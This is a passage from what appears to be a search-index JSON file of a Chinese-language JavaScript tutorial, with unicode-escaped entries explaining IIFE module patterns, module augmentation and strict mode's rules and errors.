this . _buffer . push ( str ); }, toString : function () { return this . _buffer . join ( '' ); } }; \u8fd9\u79cd\u65b9\u6cd5\u5c06\u79c1\u6709\u53d8\u91cf\u653e\u5165\u5b9e\u4f8b\u5bf9\u8c61\u4e2d\uff0c\u597d\u5904\u662f\u770b\u4e0a\u53bb\u66f4\u81ea\u7136\uff0c\u4f46\u662f\u5b83\u7684\u79c1\u6709\u53d8\u91cf\u53ef\u4ee5\u4ece\u5916\u90e8\u8bfb\u5199\uff0c\u4e0d\u662f\u5f88\u5b89\u5168\u3002","title":"\u5c01\u88c5\u79c1\u6709\u53d8\u91cf\uff1a\u6784\u9020\u51fd\u6570\u7684\u5199\u6cd5"},{"location":"oop/prototype/#_10","text":"\u53e6\u4e00\u79cd\u505a\u6cd5\u662f\u4f7f\u7528\u201c\u7acb\u5373\u6267\u884c\u51fd\u6570\u201d\uff08Immediately-Invoked Function Expression\uff0cIIFE\uff09\uff0c\u5c06\u76f8\u5173\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5c01\u88c5\u5728\u4e00\u4e2a\u51fd\u6570\u4f5c\u7528\u57df\u91cc\u9762\uff0c\u53ef\u4ee5\u8fbe\u5230\u4e0d\u66b4\u9732\u79c1\u6709\u6210\u5458\u7684\u76ee\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var module1 = ( function () { \u3000 var _count = 0 ; \u3000 var m1 = function () { \u3000 //... \u3000 }; \u3000 var m2 = function () { \u3000\u3000 //... \u3000 }; \u3000 return { \u3000\u3000 m1 : m1 , \u3000\u3000 m2 : m2 \u3000 }; })(); \u4f7f\u7528\u4e0a\u9762\u7684\u5199\u6cd5\uff0c\u5916\u90e8\u4ee3\u7801\u65e0\u6cd5\u8bfb\u53d6\u5185\u90e8\u7684 _count \u53d8\u91cf\u3002 1 console . info ( module1 . _count ); //undefined \u4e0a\u9762\u7684 module1 \u5c31\u662f JavaScript \u6a21\u5757\u7684\u57fa\u672c\u5199\u6cd5\u3002\u4e0b\u9762\uff0c\u518d\u5bf9\u8fd9\u79cd\u5199\u6cd5\u8fdb\u884c\u52a0\u5de5\u3002","title":"\u5c01\u88c5\u79c1\u6709\u53d8\u91cf\uff1a\u7acb\u5373\u6267\u884c\u51fd\u6570\u7684\u5199\u6cd5"},{"location":"oop/prototype/#_11","text":"\u5982\u679c\u4e00\u4e2a\u6a21\u5757\u5f88\u5927\uff0c\u5fc5\u987b\u5206\u6210\u51e0\u4e2a\u90e8\u5206\uff0c\u6216\u8005\u4e00\u4e2a\u6a21\u5757\u9700\u8981\u7ee7\u627f\u53e6\u4e00\u4e2a\u6a21\u5757\uff0c\u8fd9\u65f6\u5c31\u6709\u5fc5\u8981\u91c7\u7528\u201c\u653e\u5927\u6a21\u5f0f\u201d\uff08augmentation\uff09\u3002 1 2 3 4 5 6 var module1 = ( function ( mod ){ \u3000 mod . m3 = function () { \u3000\u3000 //... \u3000 }; \u3000 return mod ; })( module1 ); \u4e0a\u9762\u7684\u4ee3\u7801\u4e3a module1 \u6a21\u5757\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u65b9\u6cd5 m3() \uff0c\u7136\u540e\u8fd4\u56de\u65b0\u7684 module1 \u6a21\u5757\u3002 \u5728\u6d4f\u89c8\u5668\u73af\u5883\u4e2d\uff0c\u6a21\u5757\u7684\u5404\u4e2a\u90e8\u5206\u901a\u5e38\u90fd\u662f\u4ece\u7f51\u4e0a\u83b7\u53d6\u7684\uff0c\u6709\u65f6\u65e0\u6cd5\u77e5\u9053\u54ea\u4e2a\u90e8\u5206\u4f1a\u5148\u52a0\u8f7d\u3002\u5982\u679c\u91c7\u7528\u4e0a\u9762\u7684\u5199\u6cd5\uff0c\u7b2c\u4e00\u4e2a\u6267\u884c\u7684\u90e8\u5206\u6709\u53ef\u80fd\u52a0\u8f7d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7a7a\u5bf9\u8c61\uff0c\u8fd9\u65f6\u5c31\u8981\u91c7\u7528\"\u5bbd\u653e\u5927\u6a21\u5f0f\"\uff08Loose augmentation\uff09\u3002 1 2 3 4 var module1 = ( function ( mod ) { \u3000 //... \u3000 return mod ; })( window . module1 || {}); \u4e0e\"\u653e\u5927\u6a21\u5f0f\"\u76f8\u6bd4\uff0c\u201c\u5bbd\u653e\u5927\u6a21\u5f0f\u201d\u5c31\u662f\u201c\u7acb\u5373\u6267\u884c\u51fd\u6570\u201d\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u7a7a\u5bf9\u8c61\u3002","title":"\u6a21\u5757\u7684\u653e\u5927\u6a21\u5f0f"},{"location":"oop/prototype/#_12","text":"\u72ec\u7acb\u6027\u662f\u6a21\u5757\u7684\u91cd\u8981\u7279\u70b9\uff0c\u6a21\u5757\u5185\u90e8\u6700\u597d\u4e0d\u4e0e\u7a0b\u5e8f\u7684\u5176\u4ed6\u90e8\u5206\u76f4\u63a5\u4ea4\u4e92\u3002 \u4e3a\u4e86\u5728\u6a21\u5757\u5185\u90e8\u8c03\u7528\u5168\u5c40\u53d8\u91cf\uff0c\u5fc5\u987b\u663e\u5f0f\u5730\u5c06\u5176\u4ed6\u53d8\u91cf\u8f93\u5165\u6a21\u5757\u3002 1 2 3 var module1 = ( function ( $ , YAHOO ) { \u3000 //... })( jQuery , YAHOO ); \u4e0a\u9762\u7684 module1 \u6a21\u5757\u9700\u8981\u4f7f\u7528 jQuery \u5e93\u548c YUI \u5e93\uff0c\u5c31\u628a\u8fd9\u4e24\u4e2a\u5e93\uff08\u5176\u5b9e\u662f\u4e24\u4e2a\u6a21\u5757\uff09\u5f53\u4f5c\u53c2\u6570\u8f93\u5165 module1 \u3002\u8fd9\u6837\u505a\u9664\u4e86\u4fdd\u8bc1\u6a21\u5757\u7684\u72ec\u7acb\u6027\uff0c\u8fd8\u4f7f\u5f97\u6a21\u5757\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u53d8\u5f97\u660e\u663e\u3002 \u7acb\u5373\u6267\u884c\u51fd\u6570\u8fd8\u53ef\u4ee5\u8d77\u5230\u547d\u540d\u7a7a\u95f4\u7684\u4f5c\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ( function ( $ , window , document ) { function go ( num ) { } function handleEvents () { } function initialize () { } function dieCarouselDie () { } //attach to the global scope window . finalCarousel = { init : initialize , destroy : dieCarouselDie } })( jQuery , window , document ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c finalCarousel \u5bf9\u8c61\u8f93\u51fa\u5230\u5168\u5c40\uff0c\u5bf9\u5916\u66b4\u9732 init \u548c destroy \u63a5\u53e3\uff0c\u5185\u90e8\u65b9\u6cd5 go \u3001 handleEvents \u3001 initialize \u3001 dieCarouselDie \u90fd\u662f\u5916\u90e8\u65e0\u6cd5\u8c03\u7528\u7684\u3002","title":"\u8f93\u5165\u5168\u5c40\u53d8\u91cf"},{"location":"oop/prototype/#_13","text":"JavaScript Modules: A Beginner\u2019s Guide , by Preethi Kasireddy","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"oop/strict/","text":"\u4e25\u683c\u6a21\u5f0f \u00b6 \u9664\u4e86\u6b63\u5e38\u7684\u8fd0\u884c\u6a21\u5f0f\uff0cJavaScript \u8fd8\u6709\u7b2c\u4e8c\u79cd\u8fd0\u884c\u6a21\u5f0f\uff1a\u4e25\u683c\u6a21\u5f0f\uff08strict mode\uff09\u3002\u987e\u540d\u601d\u4e49\uff0c\u8fd9\u79cd\u6a21\u5f0f\u91c7\u7528\u66f4\u52a0\u4e25\u683c\u7684 JavaScript \u8bed\u6cd5\u3002 \u540c\u6837\u7684\u4ee3\u7801\uff0c\u5728\u6b63\u5e38\u6a21\u5f0f\u548c\u4e25\u683c\u6a21\u5f0f\u4e2d\uff0c\u53ef\u80fd\u4f1a\u6709\u4e0d\u4e00\u6837\u7684\u8fd0\u884c\u7ed3\u679c\u3002\u4e00\u4e9b\u5728\u6b63\u5e38\u6a21\u5f0f\u4e0b\u53ef\u4ee5\u8fd0\u884c\u7684\u8bed\u53e5\uff0c\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\u5c06\u4e0d\u80fd\u8fd0\u884c\u3002 \u8bbe\u8ba1\u76ee\u7684 \u00b6 \u65e9\u671f\u7684 JavaScript \u8bed\u8a00\u6709\u5f88\u591a\u8bbe\u8ba1\u4e0d\u5408\u7406\u7684\u5730\u65b9\uff0c\u4f46\u662f\u4e3a\u4e86\u517c\u5bb9\u4ee5\u524d\u7684\u4ee3\u7801\uff0c\u53c8\u4e0d\u80fd\u6539\u53d8\u8001\u7684\u8bed\u6cd5\uff0c\u53ea\u80fd\u4e0d\u65ad\u6dfb\u52a0\u65b0\u7684\u8bed\u6cd5\uff0c\u5f15\u5bfc\u7a0b\u5e8f\u5458\u4f7f\u7528\u65b0\u8bed\u6cd5\u3002 \u4e25\u683c\u6a21\u5f0f\u662f\u4ece ES5 \u8fdb\u5165\u6807\u51c6\u7684\uff0c\u4e3b\u8981\u76ee\u7684\u6709\u4ee5\u4e0b\u51e0\u4e2a\u3002 \u660e\u786e\u7981\u6b62\u4e00\u4e9b\u4e0d\u5408\u7406\u3001\u4e0d\u4e25\u8c28\u7684\u8bed\u6cd5\uff0c\u51cf\u5c11 JavaScript \u8bed\u8a00\u7684\u4e00\u4e9b\u602a\u5f02\u884c\u4e3a\u3002 \u589e\u52a0\u66f4\u591a\u62a5\u9519\u7684\u573a\u5408\uff0c\u6d88\u9664\u4ee3\u7801\u8fd0\u884c\u7684\u4e00\u4e9b\u4e0d\u5b89\u5168\u4e4b\u5904\uff0c\u4fdd\u8bc1\u4ee3\u7801\u8fd0\u884c\u7684\u5b89\u5168\u3002 \u63d0\u9ad8\u7f16\u8bd1\u5668\u6548\u7387\uff0c\u589e\u52a0\u8fd0\u884c\u901f\u5ea6\u3002 \u4e3a\u672a\u6765\u65b0\u7248\u672c\u7684 JavaScript \u8bed\u6cd5\u505a\u597d\u94fa\u57ab\u3002 \u603b\u4e4b\uff0c\u4e25\u683c\u6a21\u5f0f\u4f53\u73b0\u4e86 JavaScript \u66f4\u5408\u7406\u3001\u66f4\u5b89\u5168\u3001\u66f4\u4e25\u8c28\u7684\u53d1\u5c55\u65b9\u5411\u3002 \u542f\u7528\u65b9\u6cd5 \u00b6 \u8fdb\u5165\u4e25\u683c\u6a21\u5f0f\u7684\u6807\u5fd7\uff0c\u662f\u4e00\u884c\u5b57\u7b26\u4e32 use strict \u3002 1 'use strict' ; \u8001\u7248\u672c\u7684\u5f15\u64ce\u4f1a\u628a\u5b83\u5f53\u4f5c\u4e00\u884c\u666e\u901a\u5b57\u7b26\u4e32\uff0c\u52a0\u4ee5\u5ffd\u7565\u3002\u65b0\u7248\u672c\u7684\u5f15\u64ce\u5c31\u4f1a\u8fdb\u5165\u4e25\u683c\u6a21\u5f0f\u3002 \u4e25\u683c\u6a21\u5f0f\u53ef\u4ee5\u7528\u4e8e\u6574\u4e2a\u811a\u672c\uff0c\u4e5f\u53ef\u4ee5\u53ea\u7528\u4e8e\u5355\u4e2a\u51fd\u6570\u3002 \uff081\uff09 \u6574\u4e2a\u811a\u672c\u6587\u4ef6 use strict \u653e\u5728\u811a\u672c\u6587\u4ef6\u7684\u7b2c\u4e00\u884c\uff0c\u6574\u4e2a\u811a\u672c\u90fd\u5c06\u4ee5\u4e25\u683c\u6a21\u5f0f\u8fd0\u884c\u3002\u5982\u679c\u8fd9\u884c\u8bed\u53e5\u4e0d\u5728\u7b2c\u4e00\u884c\u5c31\u65e0\u6548\uff0c\u6574\u4e2a\u811a\u672c\u4f1a\u4ee5\u6b63\u5e38\u6a21\u5f0f\u8fd0\u884c\u3002(\u4e25\u683c\u5730\u8bf4\uff0c\u53ea\u8981\u524d\u9762\u4e0d\u662f\u4ea7\u751f\u5b9e\u9645\u8fd0\u884c\u7ed3\u679c\u7684\u8bed\u53e5\uff0c use strict \u53ef\u4ee5\u4e0d\u5728\u7b2c\u4e00\u884c\uff0c\u6bd4\u5982\u76f4\u63a5\u8ddf\u5728\u4e00\u4e2a\u7a7a\u7684\u5206\u53f7\u540e\u9762\uff0c\u6216\u8005\u8ddf\u5728\u6ce8\u91ca\u540e\u9762\u3002) 1 2 3 4 5 6 7 8 < script > 'use strict' ; console . log ( '\u8fd9\u662f\u4e25\u683c\u6a21\u5f0f' ); </ script > < script > console . log ( '\u8fd9\u662f\u6b63\u5e38\u6a21\u5f0f' ); </ script > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u4e2a\u7f51\u9875\u6587\u4ef6\u4f9d\u6b21\u6709\u4e24\u6bb5 JavaScript \u4ee3\u7801\u3002\u524d\u4e00\u4e2a <script> \u6807\u7b7e\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u540e\u4e00\u4e2a\u4e0d\u662f\u3002 \u5982\u679c use strict \u5199\u6210\u4e0b\u9762\u8fd9\u6837\uff0c\u5219\u4e0d\u8d77\u4f5c\u7528\uff0c\u4e25\u683c\u6a21\u5f0f\u5fc5\u987b\u4ece\u4ee3\u7801\u4e00\u5f00\u59cb\u5c31\u751f\u6548\u3002 1 2 3 4 < script > console . log ( '\u8fd9\u662f\u6b63\u5e38\u6a21\u5f0f' ); 'use strict' ; </ script > \uff082\uff09\u5355\u4e2a\u51fd\u6570 use strict \u653e\u5728\u51fd\u6570\u4f53\u7684\u7b2c\u4e00\u884c\uff0c\u5219\u6574\u4e2a\u51fd\u6570\u4ee5\u4e25\u683c\u6a21\u5f0f\u8fd0\u884c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function strict () { 'use strict' ; return '\u8fd9\u662f\u4e25\u683c\u6a21\u5f0f' ; } function strict2 () { 'use strict' ; function f () { return '\u8fd9\u4e5f\u662f\u4e25\u683c\u6a21\u5f0f' ; } return f (); } function notStrict () { return '\u8fd9\u662f\u6b63\u5e38\u6a21\u5f0f' ; } \u6709\u65f6\uff0c\u9700\u8981\u628a\u4e0d\u540c\u7684\u811a\u672c\u5408\u5e76\u5728\u4e00\u4e2a\u6587\u4ef6\u91cc\u9762\u3002\u5982\u679c\u4e00\u4e2a\u811a\u672c\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u53e6\u4e00\u4e2a\u811a\u672c\u4e0d\u662f\uff0c\u5b83\u4eec\u7684\u5408\u5e76\u5c31\u53ef\u80fd\u51fa\u9519\u3002\u4e25\u683c\u6a21\u5f0f\u7684\u811a\u672c\u5728\u524d\uff0c\u5219\u5408\u5e76\u540e\u7684\u811a\u672c\u90fd\u662f\u4e25\u683c\u6a21\u5f0f\uff1b\u5982\u679c\u6b63\u5e38\u6a21\u5f0f\u7684\u811a\u672c\u5728\u524d\uff0c\u5219\u5408\u5e76\u540e\u7684\u811a\u672c\u90fd\u662f\u6b63\u5e38\u6a21\u5f0f\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u5408\u5e76\u540e\u7684\u7ed3\u679c\u90fd\u662f\u4e0d\u6b63\u786e\u7684\u3002\u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u628a\u6574\u4e2a\u811a\u672c\u6587\u4ef6\u653e\u5728\u4e00\u4e2a\u7acb\u5373\u6267\u884c\u7684\u533f\u540d\u51fd\u6570\u4e4b\u4e2d\u3002 1 2 3 4 ( function () { 'use strict' ; // some code here })(); \u663e\u5f0f\u62a5\u9519 \u00b6 \u4e25\u683c\u6a21\u5f0f\u4f7f\u5f97 JavaScript \u7684\u8bed\u6cd5\u53d8\u5f97\u66f4\u4e25\u683c\uff0c\u66f4\u591a\u7684\u64cd\u4f5c\u4f1a\u663e\u5f0f\u62a5\u9519\u3002\u5176\u4e2d\u6709\u4e9b\u64cd\u4f5c\uff0c\u5728\u6b63\u5e38\u6a21\u5f0f\u4e0b\u53ea\u4f1a\u9ed8\u9ed8\u5730\u5931\u8d25\uff0c\u4e0d\u4f1a\u62a5\u9519\u3002 \u53ea\u8bfb\u5c5e\u6027\u4e0d\u53ef\u5199 \u00b6 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u8bbe\u7f6e\u5b57\u7b26\u4e32\u7684 length \u5c5e\u6027\uff0c\u4f1a\u62a5\u9519\u3002 1 2 3 'use strict' ; 'abc' . length = 5 ; // TypeError: Cannot assign to read only property 'length' of string 'abc' \u4e0a\u9762\u4ee3\u7801\u62a5\u9519\uff0c\u56e0\u4e3a length \u662f\u53ea\u8bfb\u5c5e\u6027\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\u4e0d\u53ef\u5199\u3002\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u6539\u53d8 length \u5c5e\u6027\u662f\u65e0\u6548\u7684\uff0c\u4f46\u4e0d\u4f1a\u62a5\u9519\u3002 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5bf9\u53ea\u8bfb\u5c5e\u6027\u8d4b\u503c\uff0c\u6216\u8005\u5220\u9664\u4e0d\u53ef\u914d\u7f6e\uff08non-configurable\uff09\u5c5e\u6027\u90fd\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // \u5bf9\u53ea\u8bfb\u5c5e\u6027\u8d4b\u503c\u4f1a\u62a5\u9519 'use strict' ; Object . defineProperty ({}, 'a' , { value : 37 , writable : false }); obj . a = 123 ; // TypeError: Cannot assign to read only property 'a' of object #<Object> // \u5220\u9664\u4e0d\u53ef\u914d\u7f6e\u7684\u5c5e\u6027\u4f1a\u62a5\u9519 'use strict' ; var obj = Object . defineProperty ({}, 'p' , { value : 1 , configurable : false }); delete obj . p // TypeError: Cannot delete property 'p' of #<Object> \u53ea\u8bbe\u7f6e\u4e86\u53d6\u503c\u5668\u7684\u5c5e\u6027\u4e0d\u53ef\u5199 \u00b6 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5bf9\u4e00\u4e2a\u53ea\u6709\u53d6\u503c\u5668\uff08getter\uff09\u3001\u6ca1\u6709\u5b58\u503c\u5668\uff08setter\uff09\u7684\u5c5e\u6027\u8d4b\u503c\uff0c\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 'use strict' ; var obj = { get v () { return 1 ; } }; obj . v = 2 ; // Uncaught TypeError: Cannot set property v of #<Object> which has only a getter \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.v \u53ea\u6709\u53d6\u503c\u5668\uff0c\u6ca1\u6709\u5b58\u503c\u5668\uff0c\u5bf9\u5b83\u8fdb\u884c\u8d4b\u503c\u5c31\u4f1a\u62a5\u9519\u3002 \u7981\u6b62\u6269\u5c55\u7684\u5bf9\u8c61\u4e0d\u53ef\u6269\u5c55 \u00b6 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5bf9\u7981\u6b62\u6269\u5c55\u7684\u5bf9\u8c61\u6dfb\u52a0\u65b0\u5c5e\u6027\uff0c\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 'use strict' ; var obj = {}; Object . preventExtensions ( obj ); obj . v = 1 ; // Uncaught TypeError: Cannot add property v, object is not extensible \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj \u5bf9\u8c61\u7981\u6b62\u6269\u5c55\uff0c\u6dfb\u52a0\u5c5e\u6027\u5c31\u4f1a\u62a5\u9519\u3002 eval\u3001arguments \u4e0d\u53ef\u7528\u4f5c\u6807\u8bc6\u540d \u00b6 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u4f7f\u7528 eval \u6216\u8005 arguments \u4f5c\u4e3a\u6807\u8bc6\u540d\uff0c\u5c06\u4f1a\u62a5\u9519\u3002\u4e0b\u9762\u7684\u8bed\u53e5\u90fd\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 'use strict' ; var eval = 17 ; var arguments = 17 ; var obj = { set p ( arguments ) { } }; try { } catch ( arguments ) { } function x ( eval ) { } function arguments () { } var y = function eval () { }; var f = new Function ( 'arguments' , \"'use strict'; return 17;\" ); // SyntaxError: Unexpected eval or arguments in strict mode \u51fd\u6570\u4e0d\u80fd\u6709\u91cd\u540d\u7684\u53c2\u6570 \u00b6 \u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u5982\u679c\u51fd\u6570\u6709\u591a\u4e2a\u91cd\u540d\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u7528 arguments[i] \u8bfb\u53d6\u3002\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u8fd9\u5c5e\u4e8e\u8bed\u6cd5\u9519\u8bef\u3002 1 2 3 4 5 function f ( a , a , b ) { 'use strict' ; return a + b ; } // Uncaught SyntaxError: Duplicate parameter name not allowed in this context \u7981\u6b62\u516b\u8fdb\u5236\u7684\u524d\u7f000\u8868\u793a\u6cd5 \u00b6 \u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u6574\u6570\u7684\u7b2c\u4e00\u4f4d\u5982\u679c\u662f 0 \uff0c\u8868\u793a\u8fd9\u662f\u516b\u8fdb\u5236\u6570\uff0c\u6bd4\u5982 0100 \u7b49\u4e8e\u5341\u8fdb\u5236\u768464\u3002\u4e25\u683c\u6a21\u5f0f\u7981\u6b62\u8fd9\u79cd\u8868\u793a\u6cd5\uff0c\u6574\u6570\u7b2c\u4e00\u4f4d\u4e3a 0 \uff0c\u5c06\u62a5\u9519\u3002 1 2 3 'use strict' ; var n = 0100 ; // Uncaught SyntaxError: Octal literals are not allowed in strict mode. \u589e\u5f3a\u7684\u5b89\u5168\u63aa\u65bd \u00b6 \u4e25\u683c\u6a21\u5f0f\u589e\u5f3a\u4e86\u5b89\u5168\u4fdd\u62a4\uff0c\u4ece\u8bed\u6cd5\u4e0a\u9632\u6b62\u4e86\u4e00\u4e9b\u4e0d\u5c0f\u5fc3\u4f1a\u51fa\u73b0\u7684\u9519\u8bef\u3002 \u5168\u5c40\u53d8\u91cf\u663e\u5f0f\u58f0\u660e \u00b6 \u6b63\u5e38\u6a21\u5f0f\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u53d8\u91cf\u6ca1\u6709\u58f0\u660e\u5c31\u8d4b\u503c\uff0c\u9ed8\u8ba4\u662f\u5168\u5c40\u53d8\u91cf\u3002\u4e25\u683c\u6a21\u5f0f\u7981\u6b62\u8fd9\u79cd\u7528\u6cd5\uff0c\u5168\u5c40\u53d8\u91cf\u5fc5\u987b\u663e\u5f0f\u58f0\u660e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 'use strict' ; v = 1 ; // \u62a5\u9519\uff0cv\u672a\u58f0\u660e for ( i = 0 ; i < 2 ; i ++ ) { // \u62a5\u9519\uff0ci \u672a\u58f0\u660e // ... } function f () { x = 123 ; } f () // \u62a5\u9519\uff0c\u672a\u58f0\u660e\u5c31\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf \u56e0\u6b64\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u53d8\u91cf\u90fd\u5fc5\u987b\u5148\u58f0\u660e\uff0c\u7136\u540e\u518d\u4f7f\u7528\u3002 \u7981\u6b62 this \u5173\u952e\u5b57\u6307\u5411\u5168\u5c40\u5bf9\u8c61 \u00b6 \u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u51fd\u6570\u5185\u90e8\u7684 this \u53ef\u80fd\u4f1a\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u4e25\u683c\u6a21\u5f0f\u7981\u6b62\u8fd9\u79cd\u7528\u6cd5\uff0c\u907f\u514d\u65e0\u610f\u95f4\u521b\u9020\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // \u6b63\u5e38\u6a21\u5f0f function f () { console . log ( this === window ); } f () // true // \u4e25\u683c\u6a21\u5f0f function f () { 'use strict' ; console . log ( this === undefined ); } f () // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e25\u683c\u6a21\u5f0f\u7684\u51fd\u6570\u4f53\u5185\u90e8 this \u662f undefined \u3002 \u8fd9\u79cd\u9650\u5236\u5bf9\u4e8e\u6784\u9020\u51fd\u6570\u5c24\u5176\u6709\u7528\u3002\u4f7f\u7528\u6784\u9020\u51fd\u6570\u65f6\uff0c\u6709\u65f6\u5fd8\u4e86\u52a0 new \uff0c\u8fd9\u65f6 this \u4e0d\u518d\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u800c\u662f\u62a5\u9519\u3002 1 2 3 4 5 6 function f () { 'use strict' ; this . a = 1 ; }; f (); // \u62a5\u9519\uff0cthis \u672a\u5b9a\u4e49 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u51fd\u6570\u76f4\u63a5\u8c03\u7528\u65f6\uff08\u4e0d\u4f7f\u7528 new \u8c03\u7528\uff09\uff0c\u51fd\u6570\u5185\u90e8\u7684 this \u8868\u793a undefined \uff08\u672a\u5b9a\u4e49\uff09\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528 call \u3001 apply \u548c bind \u65b9\u6cd5\uff0c\u5c06\u4efb\u610f\u503c\u7ed1\u5b9a\u5728 this \u4e0a\u9762\u3002\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c this \u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u5982\u679c\u7ed1\u5b9a\u7684\u503c\u662f\u975e\u5bf9\u8c61\uff0c\u5c06\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5bf9\u8c61\u518d\u7ed1\u5b9a\u4e0a\u53bb\uff0c\u800c null \u548c undefined \u8fd9\u4e24\u4e2a\u65e0\u6cd5\u8f6c\u6210\u5bf9\u8c61\u7684\u503c\uff0c\u5c06\u88ab\u5ffd\u7565\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // \u6b63\u5e38\u6a21\u5f0f function fun () { return this ; } fun () // window fun . call ( 2 ) // Number {2} fun . call ( true ) // Boolean {true} fun . call ( null ) // window fun . call ( undefined ) // window // \u4e25\u683c\u6a21\u5f0f 'use strict' ; function fun () { return this ; } fun () //undefined fun . call ( 2 ) // 2 fun . call ( true ) // true fun . call ( null ) // null fun . call ( undefined ) // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ef\u4ee5\u628a\u4efb\u610f\u7c7b\u578b\u7684\u503c\uff0c\u7ed1\u5b9a\u5728 this \u4e0a\u9762\u3002 \u7981\u6b62\u4f7f\u7528 fn.callee\u3001fn.caller \u00b6 \u51fd\u6570\u5185\u90e8\u4e0d\u5f97\u4f7f\u7528 fn.caller \u3001 fn.arguments \uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u8fd9\u610f\u5473\u7740\u4e0d\u80fd\u5728\u51fd\u6570\u5185\u90e8\u5f97\u5230\u8c03\u7528\u6808\u4e86\u3002 1 2 3 4 5 6 7 function f1 () { 'use strict' ; f1 . caller ; // \u62a5\u9519 f1 . arguments ; // \u62a5\u9519 } f1 (); \u7981\u6b62\u4f7f\u7528 arguments.callee\u3001arguments.caller \u00b6 arguments.callee \u548c arguments.caller \u662f\u4e24\u4e2a\u5386\u53f2\u9057\u7559\u7684\u53d8\u91cf\uff0c\u4ece\u6765\u6ca1\u6709\u6807\u51c6\u5316\u8fc7\uff0c\u73b0\u5728\u5df2\u7ecf\u53d6\u6d88\u4e86\u3002\u6b63\u5e38\u6a21\u5f0f\u4e0b\u8c03\u7528\u5b83\u4eec\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u4f46\u662f\u4e0d\u4f1a\u62a5\u9519\u3002\u4e25\u683c\u6a21\u5f0f\u660e\u786e\u89c4\u5b9a\uff0c\u51fd\u6570\u5185\u90e8\u4f7f\u7528 arguments.callee \u3001 arguments.caller \u5c06\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 'use strict' ; var f = function () { return arguments . callee ; }; f (); // \u62a5\u9519 \u7981\u6b62\u5220\u9664\u53d8\u91cf \u00b6 \u4e25\u683c\u6a21\u5f0f\u4e0b\u65e0\u6cd5\u5220\u9664\u53d8\u91cf\uff0c\u5982\u679c\u4f7f\u7528 delete \u547d\u4ee4\u5220\u9664\u4e00\u4e2a\u53d8\u91cf\uff0c\u4f1a\u62a5\u9519\u3002\u53ea\u6709\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u4e14\u5c5e\u6027\u7684\u63cf\u8ff0\u5bf9\u8c61\u7684 configurable \u5c5e\u6027\u8bbe\u7f6e\u4e3a true \uff0c\u624d\u80fd\u88ab delete \u547d\u4ee4\u5220\u9664\u3002 1 2 3 4 5 6 7 8 9 10 11 'use strict' ; var x ; delete x ; // \u8bed\u6cd5\u9519\u8bef var obj = Object . create ( null , { x : { value : 1 , configurable : true } }); delete obj . x ; // \u5220\u9664\u6210\u529f \u9759\u6001\u7ed1\u5b9a \u00b6 JavaScript \u8bed\u8a00\u7684\u4e00\u4e2a\u7279\u70b9\uff0c\u5c31\u662f\u5141\u8bb8\u201c\u52a8\u6001\u7ed1\u5b9a\u201d\uff0c\u5373\u67d0\u4e9b\u5c5e\u6027\u548c\u65b9\u6cd5\u5230\u5e95\u5c5e\u4e8e\u54ea\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4e0d\u662f\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a\u7684\uff0c\u800c\u662f\u5728\u8fd0\u884c\u65f6\uff08runtime\uff09\u786e\u5b9a\u7684\u3002 